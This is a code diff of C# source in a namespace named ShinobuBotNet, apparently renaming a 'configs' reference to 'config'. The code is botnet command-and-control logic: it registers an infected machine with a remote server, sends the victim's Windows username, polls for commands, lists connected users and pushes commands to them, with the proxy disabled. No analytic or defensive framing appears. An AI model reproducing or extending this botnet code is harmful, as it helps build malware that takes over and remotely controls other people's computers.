@@ -12,7 +12,7 @@ namespace ShinobuBotNet
         {
             WebClient wc = new WebClient();
             wc.Proxy = null;
-            string id = wc.DownloadString(configs.server + "GetID.php");
+            string id = wc.DownloadString(config.server + "GetID.php");
             return id;
         }
 
@@ -22,12 +22,12 @@ namespace ShinobuBotNet
             wc.Proxy = null;
             string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
-            string result = wc.DownloadString(configs.server + "connect.php?user=" + userName);
+            string result = wc.DownloadString(config.server + "connect.php?user=" + userName);
         }
 
         public static string cheak_connect()
         {
-            if (System.IO.File.Exists(configs.CheakFile))
+            if (System.IO.File.Exists(config.CheakFile))
             {
                 return "yes";
             }
@@ -40,12 +40,12 @@ namespace ShinobuBotNet
 
         public static void creat_cheak_File()
         {
-            System.IO.File.Create(configs.CheakFile);
+            System.IO.File.Create(config.CheakFile);
         }
 
         public static string GetCommand(string id)
         {
-            string html = web.GetHTML(configs.server + "getcommand.php?id=" + id);
+            string html = web.GetHTML(config.server + "getcommand.php?id=" + id);
             cmd command = new cmd(html);
             if (command.ComType == null)
             {
@@ -61,7 +61,7 @@ namespace ShinobuBotNet
         {
             WebClient wc = new WebClient();
             wc.Proxy = null;
-            string list = wc.DownloadString(configs.server + "getusers.php");
+            string list = wc.DownloadString(config.server + "getusers.php");
             return list;
         }
         public static string SendCommand(string id, string type, string content)
@@ -70,12 +70,12 @@ namespace ShinobuBotNet
             wc.Proxy = null;
             if(content == null)
             {
-                string result = wc.DownloadString(configs.server + "sendcommand.php?id=" + id + "&type=" + type);
+                string result = wc.DownloadString(config.server + "sendcommand.php?id=" + id + "&type=" + type);
                 return result;
             }
             else
             {
-                string result = wc.DownloadString(configs.server + "sendcommand.php?id=" + id + "&type=" + type + "&content=" + content);
+                string result = wc.DownloadString(config.server + "sendcommand.php?id=" + id + "&type=" + type + "&content=" + content);
                 return result;
             }
         
